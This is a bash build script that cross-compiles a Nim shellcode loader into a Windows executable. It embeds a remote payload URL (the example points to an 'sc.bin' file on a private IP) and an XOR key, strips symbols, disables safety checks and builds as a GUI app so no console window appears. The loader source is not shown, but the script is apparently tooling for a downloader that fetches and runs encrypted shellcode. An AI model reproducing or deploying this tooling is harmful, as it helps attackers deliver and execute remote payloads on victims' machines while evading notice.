#!/usr/bin/env bash
# Usage: ./build.sh <payloadUrl> <xorKeyHex>
# Example: ./build.sh "https://10.0.0.1:8443/sc.bin" "aabbccdd11223344aabbccdd11223344"
set -euo pipefail

PAYLOAD_URL="${1:?Usage: $0 <payloadUrl> <xorKeyHex>}"
XOR_KEY="${2:?Usage: $0 <payloadUrl> <xorKeyHex>}"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

nim c \
  -d:mingw \
  -d:strip \
  -d:danger \
  --opt:size \
  --app:gui \
  --hints:off \
  --warnings:off \
  --cc:gcc \
  --gcc.exe:x86_64-w64-mingw32-gcc \
  --gcc.linkerexe:x86_64-w64-mingw32-gcc \
  "-d:payloadUrl=${PAYLOAD_URL}" \
  "-d:xorKey=${XOR_KEY}" \
  -o:"${SCRIPT_DIR}/loader_nim.exe" \
  "${SCRIPT_DIR}/loader.nim"

echo "[+] Built: ${SCRIPT_DIR}/loader_nim.exe"
